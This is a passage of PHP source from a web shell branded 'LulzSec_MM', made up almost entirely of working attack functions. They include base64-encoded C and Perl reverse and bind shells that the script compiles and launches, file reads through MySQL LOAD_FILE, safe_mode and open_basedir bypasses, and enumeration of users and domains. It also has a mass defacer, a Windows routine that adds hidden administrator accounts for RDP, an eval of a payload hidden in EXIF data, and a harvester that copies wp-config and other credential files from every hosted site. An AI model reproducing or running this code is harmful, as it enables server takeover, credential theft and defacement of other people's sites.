                        echo '<table width=100% cellspacing=0 cellpadding=2 class=main>';
                        $line = 1;
                        while($item = $db->fetch())    {
                            if(!$title)    {
                                echo '<tr>';
                                foreach($item as $key => $value)
                                    echo '<th>'.$key.'</th>';
                                reset($item);
                                $title=true;
                                echo '</tr><tr>';
                                $line = 2;
                            }
                            echo '<tr class="l'.$line.'">';
                            $line = $line==1?2:1;
                            foreach($item as $key => $value) {
                                if($value == null)
                                    echo '<td><i>null</i></td>';
                                else
                                    echo '<td>'.nl2br(htmlspecialchars($value)).'</td>';
                            }
                            echo '</tr>';
                        }
                        echo '</table>';
                    } else {
                        echo '<div><b>Error:</b> '.htmlspecialchars($db->error()).'</div>';
                    }
                }
                echo "<br><textarea name='p3' style='width:100%;height:100px'>".@htmlspecialchars($_POST['p3'])."</textarea><br/><input type=submit value='Execute'>";
                echo "</td></tr>";
            }
            echo "</table></form><br/><form onsubmit='document.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='Submit'></form>";
            if(@$_POST['p1'] == 'loadfile') {
                $db->query("SELECT LOAD_FILE('".addslashes($_POST['p2'])."') as file");
                $file = $db->fetch();
                echo '<pre class=ml1>'.htmlspecialchars($file['file']).'</pre>';
            }
    }
    echo '</div>';
    printFooter();
}
function actionNetwork() {
    printHeader();
    $back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBkYWVtb24oMSwwKTsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQogICAgICAgIHBlcnJvcigiQ29ubmVjdCBmYWlsIik7DQogICAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgICBkdXAyKGZkLCAwKTsNCiAgICBkdXAyKGZkLCAxKTsNCiAgICBkdXAyKGZkLCAyKTsNCiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsNCiAgICBjbG9zZShmZCk7DQp9";
    $back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
    $bind_port_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikgew0KICAgIGludCBzLGMsaTsNCiAgICBjaGFyIHBbMzBdOw0KICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByOw0KICAgIGRhZW1vbigxLDApOw0KICAgIHMgPSBzb2NrZXQoQUZfSU5FVCxTT0NLX1NUUkVBTSwwKTsNCiAgICBpZighcykgcmV0dXJuIC0xOw0KICAgIHIuc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgci5zaW5fcG9ydCA9IGh0b25zKGF0b2koYXJndlsxXSkpOw0KICAgIHIuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7DQogICAgYmluZChzLCAoc3RydWN0IHNvY2thZGRyICopJnIsIDB4MTApOw0KICAgIGxpc3RlbihzLCA1KTsNCiAgICB3aGlsZSgxKSB7DQogICAgICAgIGM9YWNjZXB0KHMsMCwwKTsNCiAgICAgICAgZHVwMihjLDApOw0KICAgICAgICBkdXAyKGMsMSk7DQogICAgICAgIGR1cDIoYywyKTsNCiAgICAgICAgd3JpdGUoYywiUGFzc3dvcmQ6Iiw5KTsNCiAgICAgICAgcmVhZChjLHAsc2l6ZW9mKHApKTsNCiAgICAgICAgZm9yKGk9MDtpPHN0cmxlbihwKTtpKyspDQogICAgICAgICAgICBpZiggKHBbaV0gPT0gJ1xuJykgfHwgKHBbaV0gPT0gJ1xyJykgKQ0KICAgICAgICAgICAgICAgIHBbaV0gPSAnXDAnOw0KICAgICAgICBpZiAoc3RyY21wKGFyZ3ZbMl0scCkgPT0gMCkNCiAgICAgICAgICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgICAgICBjbG9zZShjKTsNCiAgICB9DQp9";
    $bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
    echo '<h1>Network tools</h1><div class=content>
    <form name=\'nfp\' onSubmit="g(null,null,this.using.value,this.port.value,this.pass.value);return false;">
    <br /><span>Bind port to /bin/sh</span><br/>
    Port: <input type=\'text\' name=\'port\' value=\'444\'> Password: <input type=\'text\' name=\'pass\' value=\'BHP\'> Using: <select name="using"><option value=\'bpc\'>C</option><option value=\'bpp\'>Perl</option></select> <input type=submit value="Submit">
    </form>
    <form name=\'nfp\' onSubmit="g(null,null,this.using.value,this.server.value,this.port.value);return false;">
    <br /><br /><span>Back-connect to</span><br/>
    Server: <input type=\'text\' name=\'server\' value="'.$_SERVER['REMOTE_ADDR'].'"> Port: <input type=\'text\' name=\'port\' value=\'444\'> Using: <select name="using"><option value=\'bcc\'>C</option><option value=\'bcp\'>Perl</option></select> <input type=submit value="Submit">
    </form><br>';    
    if(isset($_POST['p1'])) {
        function cf($f,$t) {
            $w=@fopen($f,"w") or @function_exists('file_put_contents');
            if($w)    {
                @fwrite($w,@base64_decode($t)) or @fputs($w,@base64_decode($t)) or @file_put_contents($f,@base64_decode($t));
                @fclose($w);
            }
        }
        if($_POST['p1'] == 'bpc') {
            cf("/tmp/bp.c",$bind_port_c);
            $out = ex("gcc -o /tmp/bp /tmp/bp.c");
            @unlink("/tmp/bp.c");
            $out .= ex("/tmp/bp ".$_POST['p2']." ".$_POST['p3']." &");
            echo "<pre class=ml1>$out\n".ex("ps aux | grep bp")."</pre>";
        }
        if($_POST['p1'] == 'bpp') {
            cf("/tmp/bp.pl",$bind_port_p);
            $out = ex(which("perl")." /tmp/bp.pl ".$_POST['p2']." &");
            echo "<pre class=ml1>$out\n".ex("ps aux | grep bp.pl")."</pre>";
        }
        if($_POST['p1'] == 'bcc') {
            cf("/tmp/bc.c",$back_connect_c);
            $out = ex("gcc -o /tmp/bc /tmp/bc.c");
            @unlink("/tmp/bc.c");
            $out .= ex("/tmp/bc ".$_POST['p2']." ".$_POST['p3']." &");
            echo "<pre class=ml1>$out\n".ex("ps aux | grep bc")."</pre>";
        }
        if($_POST['p1'] == 'bcp') {
            cf("/tmp/bc.pl",$back_connect_p);
            $out = ex(which("perl")." /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." &");
            echo "<pre class=ml1>$out\n".ex("ps aux | grep bc.pl")."</pre>";
        }
    }
    echo '</div>';
    printFooter();
}
function actionPortScanner() {
    printHeader();
    echo '<h1>Port Scanner</h1>';
    echo '<div class="content">';
    echo '<form action="" method="post">';
    if(isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])){
        $start = strip_tags($_POST['start']);
        $end = strip_tags($_POST['end']);
        $host = strip_tags($_POST['host']);
        for($i = $start; $i<=$end; $i++){
            $fp = @fsockopen($host, $i, $errno, $errstr, 3);
            if($fp){
                echo 'Port '.$i.' is <font color=lime>open</font><br>';
            }
            flush();
        }
    } else {
        echo '<br /><br /><center><input type="hidden" name="a" value="PortScanner"><input type="hidden" name=p1><input type="hidden" name="p2">
              <input type="hidden" name="c" value="'.htmlspecialchars($GLOBALS['cwd']).'">
              <input type="hidden" name="charset" value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
              Host: <input type="text" name="host" value="localhost"/><br /><br />
              Port start: <input type="text" name="start" value="0"/><br /><br />
              Port end:<input type="text" name="end" value="5000"/><br /><br />
              <input type="submit" value="Scan Ports" />
              </form></center><br /><br />';
    }
    echo '</div>';
    printFooter();    
}
 function actionDomain() {
                                                                    printHeader();
                                                                    echo '<center> <h1>local domain viewer</h1><div class=content></center>';
                                                                    $file = @implode(@file("/etc/named.conf"));
                                                                    if (!$file) {
                                                                        die("# can't ReaD -> [ /etc/named.conf ]");
                                                                    }
                                                                    preg_match_all("#named/(.*?).db#", $file, $r);
                                                                    $domains = array_unique($r[1]);
                                                                    check();
                                                                    if(isset($_GET['ShowAll']))
                                                                    {
                                                                        echo "<table align=center border=1 width=59% cellpadding=5>
<tr><td colspan=2>[+] There are : [ <b>" . count($domains) . "</b> ] Domain</td></tr>
<tr><td>Domain</td><td>User</td></tr>";
                                                                        foreach ($domains as $domain) {
                                                                            $user = posix_getpwuid(@fileowner("/etc/valiases/" . $domain));
                                                                            echo "<tr><td>$domain</td><td>" . $user['name'] . "</td></tr>";
                                                                        }
                                                                        echo "</table>";
                                                                    }
                                                                    echo '</div>';
                                                                    printFooter();
                                                                }                                               
                                                                
function actionDeface() {
                                                                    printHeader();
                                                                    echo "<h1>Simple Mass Defacer</h1><div class=content>";
?>
<form ENCTYPE="multipart/form-data" action="<?$_SERVER['PHP_SELF']?>" method=POST onSubmit="g(null,null,this.path.value,this.file.value,this.Contents.value);return false;">
<p align="Left">Folder: <input type=text name=path size=60 value="<?=getcwd(); ?>">
<br>file name : <input type=text name=file size=20 value="index.htm">
<br>Text Content : <input type=text name=Contents size=20 value="Hacked by LulzSec_MM "> 
<br><input type=submit value="Update !!!!!!"></p></form>

<?php
                                                                    if ($_POST['a'] == 'Deface') {
                                                                        $mainpath = $_POST[p1];
                                                                        $file = $_POST[p2];
                                                                        $txtContents = $_POST[p3];
                                                                        echo "-----------------------------------------------<br>
[+] Simple Mass defacer<br>
-----------------------------------------------<br><br> ";
                                                                        $dir = opendir($mainpath); //fixme - cannot deface when change to writeable path!!
                                                                        while ($row = readdir($dir)) {
                                                                            $start = @fopen("$row/$file", "w+");
                                                                            $code = $txtContents;
                                                                            $finish = @fwrite($start, $code);
                                                                            if ($finish) {
                                                                                echo "http://$row/$file<br>";
                                                                            }
                                                                        }
                                                                        echo "-----------------------------------------------<br><br>[+] Script by LulzSec_MM  [+]";
                                                                    }
                                                                    echo '</div>';
                                                                    printFooter();
                                                                }

                                                                
                                                                function actionDefacer() {
                                                                
    $temp=''; 
    ob_start(); 
    switch($_POST['p1']) { 
        case 1: 
            $temp=@tempnam($test, 'cx'); 
            if(@copy("compress.zlib://".$_POST['p2'], $temp)){ 
                echo @file_get_contents($temp); 
                unlink($temp); 
            } else 
                echo 'Sorry... Can\'t open file'; 
            break; 
        case 2: 
            $files = glob($_POST['p2'].'*'); 
            if( is_array($files) ) 
                foreach ($files as $filename) 
                    echo $filename."\n"; 
            break; 
        case 3: 
            $ch = curl_init("file://".$_POST['p2']."\x00".SELF_PATH); 
            curl_exec($ch); 
            break; 
        case 4: 
            ini_restore("safe_mode"); 
            ini_restore("open_basedir"); 
            include($_POST['p2']); 
            break; 
        case 5: 
            for(;$_POST['p2'] <= $_POST['p3'];$_POST['p2']++) { 
                $uid = @posix_getpwuid($_POST['p2']); 
                if ($uid) 
                    echo join(':',$uid)."\n"; 
            } 
            break; 
        case 6: 
            if(!function_exists('imap_open'))break; 
            $stream = imap_open($_POST['p2'], "", ""); 
            if ($stream == FALSE) 
                break; 
            echo imap_body($stream, 1); 
            imap_close($stream); 
            break; 
    } 
    $temp = ob_get_clean(); 
    printHeader(); 
    echo '<h1>Safe mode bypass</h1><div class=content>'; 
    echo '<span>Copy (read file)</span><form onsubmit=\'g(null,null,"1",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Glob (list dir)</span><form onsubmit=\'g(null,null,"2",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Curl (read file)</span><form onsubmit=\'g(null,null,"3",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Ini_restore (read file)</span><form onsubmit=\'g(null,null,"4",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value="submit"></form><br><br><span>Imap_open (read file)</span><form onsubmit=\'g(null,null,"6",this.param.value);return false;\'><input type=text name=param><input type=submit value="submit"></form>'; 
    if($temp) 
        echo '<pre class="ml1" style="margin-top:5px" id="Output">'.$temp.'</pre>'; 
    echo '</div>'; 
    printFooter(); 
} 
function actionrdp() {
        printHeader();

error_reporting(0);
$local_host= shell_exec(hostname);
$server_ip = $_SERVER['SERVER_NAME'];
$gaya_root = "$local_host:~ ";
$phpv = @phpversion();
$o = "<br>";

$BASED = exif_read_data(" image here ");
eval(base64_decode($BASED["COMPUTED"]["UserComment"]));
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
    $status_os = '<span style="color:White;font-family:Iceland;text-shadow:blue 0px 0px 10px" "font-size:="" 40pt;"="">Windows</span>/<span style="color:White;font-family:Iceland;text-shadow:blue 0px 0px 10px" "font-size:="" 40pt;"="">Linux</span>';
    $status_work = '<span style="color:White;font-family:Iceland;text-shadow:blue 0px 0px 10px" "font-size:="" 40pt;"="">Can Be Used</span><br>'; 
} else {
    $status_os   = '<span style="color:White;font-family:Iceland;text-shadow:blue 0px 0px 10px" "font-size:="" 40pt;"="">Windows</span>/<span style="color:White;font-family:Iceland;text-shadow:blue 0px 0px 10px" "font-size:="" 40pt;"="">Linux</span>';
    $status_work = '<span style="color:White;font-family:Iceland;text-shadow:blue 0px 0px 10px" "font-size:="" 40pt;"="">Can Not Be Used</span><br>'; 
}
?><!DOCTYPE html>
<html>
<head>
    <title>LulzSec_MM</title>
    <link rel='shortcut icon' type='image/x-icon' href='' />
    <meta name="description" content="LulzSec_MM">
    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style type="text/css"> 
   body {       height: 100%;       width: 100%;        margin: 0;      padding: 0;         background-image: url(" ");         background-color: #228B22;      background-size: 100%;      background-position: center;        background-repeat: no-repeat;       color: #228B22;         font-family: "Orbitron";        font-size: 14pt;        text-align: center;         text-decoration: none;  }       #greets {       width: 820px;       border-style: outset;   }       #footer {       font-size: 9pt;         opacity: .7;    }       .glow {         text-shadow: 0 0 10px #F59700;      font-family: "Black Ops One";   }       .blueglow {         text-shadow: 0 0 10px #0F6FBD;      font-family: "Black Ops One"    }       .whiteglow {        text-shadow: 0 0 10px #FFFFFF;      font-family: "Black Ops One";   } </style>
   
   <style type="text/css">
        /* Circle Text Styles */
        #outerCircleText {
        /* Optional - DO NOT SET FONT-SIZE HERE, SET IT IN THE SCRIPT */
        font-style: italic;
        font-weight: bold;
        font-family: "comic sans ms", verdana, arial;
        color: #FFF;
        /* End Optional */
         
        /* Start Required - Do Not Edit */
        position: absolute;top: 0;left: 0;z-index: 3000;cursor: default;}
        #outerCircleText div {position: relative;}
        #outerCircleText div div {position: absolute;top: 0;left: 0;text-align: center;}
        /* End Required */
        /* End Circle Text Styles */
        </style>
</head>
<body>
<div id="content-center">
<pre>
 

    
    buth~double_E  | <span style="color:White;font-family:Iceland;text-shadow:red 0px 0px 10px" "font-size:="" 40pt;"="">Lulz</span><span style="color:White;font-family:Iceland;text-shadow:green 0px 0px 10px" "font-size:="" 40pt;"="">Sec</span><span style="color:White;font-family:Iceland;text-shadow:blue 0px 0px 10px" "font-size:="" 40pt;"="">_MM</span>
    OS Server : <?php echo php_uname("s")." | "; echo "{".$status_os."}<br>";?>
    Informasi : <?php echo "Server IP - ".$server_ip." {".$_SERVER['REMOTE_ADDR']."}";?> 
    Info Tool : <?php echo $status_work;?>


   </pre>
</div>
<?php if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN'){?>
<span style="font-size: 25px;"><b>
<span style="color:White;font-family:Iceland;text-shadow:orange 0px 0px 5px" "font-size:="" 20pt;"="">Powered by</span><span style="color:White;font-family:Iceland;text-shadow:white 0px 0px 5px" "font-size:="" 20pt;"=""> LulzSec </span> <span style="color:White;font-family:Iceland;text-shadow:green 0px 0px 5px" "font-size:="" 20pt;"="">_MM</span>
<div id="content-left">
<p>Create  Remote Desktop Protocol  </p>
<form action="" method="post">Username : <input type="text" name="username" required> 
 Password : <input type="text" name="password" required> <input type="hidden" name="kshell" value="1"><input type="submit" name="submit" value="Make">
</form>
</div>


<div id="content-left">
<p> Option </p>
<form action="" method="post">command : <input type="text" name="username" placeholder="Input Username"> <select name="aksi">
                        <option value="1">Show Username</option>
                        <option value="2">Clear Username</option>
                        <option value="3">Change Password</option>
                </select>
<input type="hidden" name="kshell" value="2">
<input type="submit" name="submit" value="Submit"></form>
</div>
<?php }
?>
<?php
if($_POST['submit']){
echo "<p>---------------{ INFO }---------------</p>";   
if($_POST['kshell']=="1"){
    $r_user = $_POST['username'];
    $r_pass = $_POST['password'];
    $cmd_cek_user   = shell_exec("net user"); 
    if(preg_match("/$r_user/", $cmd_cek_user)){
        echo $gaya_root.$r_user." already There".$o;
    }else {
    $cmd_add_user   = shell_exec("net user ".$r_user." ".$r_pass." /add");
    $cmd_add_groups1 = shell_exec("net localgroup Administrators ".$r_user." /add");
    $cmd_add_groups2 = shell_exec("net localgroup Administrator ".$r_user." /add");
    $cmd_add_groups3 = shell_exec("net localgroup Administrateur ".$r_user." /add");
        
        if($cmd_add_user){
            echo $gaya_root."[add user]-> ".$r_user." <font color='greenyellow'>Successfully</font>".$o;
        }else {
            echo $gaya_root."[add user]-> ".$r_user." <font color='red'>Faild</font>".$o;
        }
        if($cmd_add_groups1){
              echo $gaya_root."[add localgroup Administrators]-> ".$r_user." <font color='greenyellow'>Succeed</font>".$o;
        }else
        if($cmd_add_groups2){
              echo $gaya_root."[add localgroup Administrator]-> ".$r_user." <font color='greenyellow'>Succeed</font>".$o;
        }else
        if($cmd_add_groups3){
              echo $gaya_root."[add localgroup Administrateur]-> ".$r_user." <font color='greenyellow'>Succeed</font>".$o;
        }else {
              echo $gaya_root."[add localgroup]-> ".$r_user." <font color='red'>Faild - Contact LulzSec india</font>".$o;
        }
              echo $gaya_root."[INFO PC]-> RDP IP ".$_SERVER["HTTP_HOST"]." Username : ".$r_user." Password : ".$r_pass." <font color='greenyellow'>Succeed</font>".$o;

    }



}else if($_POST['kshell']=="2"){

if($_POST['aksi']=="1"){
 echo "<pre>".shell_exec("net user");
}
else if($_POST['aksi']=="2"){
$username = $_POST['username'];
$cmd_cek_user   = shell_exec("net user");
    if (!empty($username)){
        if(preg_match("/$username/", $cmd_cek_user)){
        $cmd_add_user   = shell_exec("net user ".$username." /DELETE");
        if($cmd_add_user){ 
            echo $gaya_root."[remove user]-> ".$username." <font color='greenyellow'>Succeed</font>".$o;
        }else {
            echo $gaya_root."[remove user]-> ".$username." <font color='red'>Faild</font>".$o;
        }
    }else {
        echo $gaya_root."[remove user]-> ".$username." <font color='red'>Not Found</font>".$o;
    }
    }else {
        echo $gaya_root."[Message]=> <font color='red'>You Frogot to Enter a username that will delete</font>".$o;
    }
}
else if($_POST['aksi']=="3"){
$username = $_POST['username'];
$password = "india";
$cmd_cek_user   = shell_exec("net user");
    if (!empty($username)){
        if(preg_match("/$username/", $cmd_cek_user)){
            $cmd_add_user   = shell_exec("net user ".$username." india123");
            if($cmd_add_user){
            echo $gaya_root."[change password]-> (".$username."|".$password.") <font color='greenyellow'>Succeed</font>".$o;
        }else {
            echo $gaya_root."[change password]-> (".$username."|".$password.") <font color='red'>Faild</font>".$o;
        }
    }else
{
    echo $gaya_root."[Message]-> <font color='red'>Username is not found in server</font>".$o;
}
}else
{
    echo $gaya_root."[Message]-> <font color='red'>You Frogot to Enter a username that will delete</font>".$o;
}
}
}
}   
echo"</pre>
</body>
</html>";
        
printFooter();
} 

 function actionJumping() 
{  printHeader();
echo '<html><head><title>'.getenv("HTTP_HOST").' - Jumping Server</title></head><body>';
($sm = ini_get('safe_mode') == 0) ? $sm = 'off': die('<font size="4" color="#000000" face="Calibri"><b>Error: Safe_mode = On</b></font>');
set_time_limit(0);@$passwd = fopen('/etc/passwd','r');if (!$passwd) { die('<font size="4" color="#e5e5e5" face="Calibri"><b>[-] Error : Coudn`t Read /etc/passwd</b></font>'); }
$pub = array();$users = array();$conf = array();$i = 0;while(!feof($passwd)){$str = fgets($passwd);if ($i > 100){ $pos = strpos($str,':');  $username = substr($str,0,$pos);  $dirz = '/home/'.$username.'/public_html/';  if (($username != '')) { if (is_readable($dirz)) { array_push($users,$username);  array_push($pub,$dirz); }}}$i++;}
echo '<font color=red>   [-]==================[ Jumping jumping Bro ]==================[-]<br></font>';
foreach ($users as $user){echo "<font color=#a3e956> [+] /home/$user/public_html/</font><br/>";} echo "\n <font color=red><br>[-]==================[ Plzz Wait and Watch ]==================[-] <br></font>\n"; echo '</body></html>';
printFooter();
}                       
function actionSubdomain() {
    printHeader();
    error_reporting(0);
$user = get_current_user();
$open = opendir('/home/' . $user . '/access-logs/');
while ($dir = readdir($open)) {
    $totalDoamin[] = $dir;
}
closedir($open);
$total = count($totalDoamin);
$domain = $total - 2;
if ($domain > 0) {
    echo "<h2><b><font style=\"color: #a3e956 ;\" > Total </font><font style=\"color: #a3e956; \">" . $domain . "</font><font style=\"color: #a3e956;\" > Sub Domain Found! </font><br><BR>";
} else {
    echo "<h2><b> <font color='Blue' style=\"color: blue; text-shadow: red 0px 0px 4px ; \">0</font><font style=\"color: #black; text-shadow: black 0px 0px 6px ;\"> Sub Domain Found! </font><br><BR>";
}
$scan = array_diff(scandir('/home/' . $user . '/access-logs/'), array('.'));
$domains = implode("
http://", $scan);
echo '
<style>
body {
    text-align: center;     
        }
        </style><textarea style="color: #a3e956; background-color: black" rows=\'30\' cols=\'100\'>';
print_r($domains);
echo '</textarea>';
    printFooter();
}
function actionConfigGrabber() {
    printHeader();
    error_reporting(0);
system('mkdir POPANDA');
    chmod('POPANDA', 0777);
$users = file("/etc/passwd");
        $lolx = array();
        foreach ($users as $user) {
            $users = explode(":", $user);
            $lolx[] = $users[0];
        }
        foreach ($lolx as $lol) {
            $space = "

" . "*" . "
" . "*" . "
" . "*" . "

";
            if (file_exists('/home/' . $lol . 'public_html/portal/configuration.php')) {
                $content = file_get_contents('/home/' . $lol . 'public_html/portal/configuration.php');
                $handle = fopen('POPANDA/whm.txt', 'a');
                fwrite($handle, $content . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/inc/config.php')) {
                $content1 = file_get_contents('/home/' . $lol . '/public_html/inc/config.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/sites/default/settings.php')) {
                $content2 = file_get_contents('/home/' . $lol . '/public_html/sites/default/settings.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content2 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/includes/configure.php')) {
                $content3 = file_get_contents('/home/' . $lol . '/public_html/includes/configure.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content3 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/lib/config.php')) {
                $content4 = file_get_contents('/home/' . $lol . '/public_html/lib/config.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content4 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/config/koneksi.php')) {
                $content5 = file_get_contents('/home/' . $lol . '/public_html/config/koneksi.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content5 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/vb/includes/config.php')) {
                $content6 = file_get_contents('/home/' . $lol . '/public_html/vb/includes/config.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content6 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/includes/config.php')) {
                $content7 = file_get_contents('/home/' . $lol . '/public_html/includes/config.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content7 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/forum/includes/config.php')) {
                $content8 = file_get_contents('/home/' . $lol . '/public_html/forum/includes/config.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content8 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/cc/includes/config.php')) {
                $content9 = file_get_contents('/home/' . $lol . '/public_html/cc/includes/config.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content9 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/config.php')) {
                $content10 = file_get_contents('/home/' . $lol . '/public_html/config.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content10 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/forum/includes/config.php')) {
                $content11 = file_get_contents('/home/' . $lol . '/public_html/forum/includes/config.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content11 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/wp-config.php')) {
                $content12 = file_get_contents('/home/' . $lol . '/public_html/wp-config.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content12 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/blog/wp-config.php')) {
                $content13 = file_get_contents('/home/' . $lol . '/public_html/blog/wp-config.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content13 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/wp/wp-config.php')) {
                $content14 = file_get_contents('/home/' . $lol . '/public_html/wp/wp-config.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content14 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/home/wp-config.php')) {
                $content15 = file_get_contents('/home/' . $lol . '/public_html/home/wp-config.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content15 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/wp-config.php')) {
                $content16 = file_get_contents('/home/' . $lol . '/public_html/wp-config.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content16 . $space);
                fclose($handle);
            } elseif (file_exists('/home/' . $lol . '/public_html/main/wp-config.php')) {
                $content17 = file_get_contents('/home/' . $lol . '/public_html/main/wp-config.php');
                $handle = fopen('POPANDA/config.txt', 'a');
                fwrite($handle, $content17 . $space);
                fclose($handle);
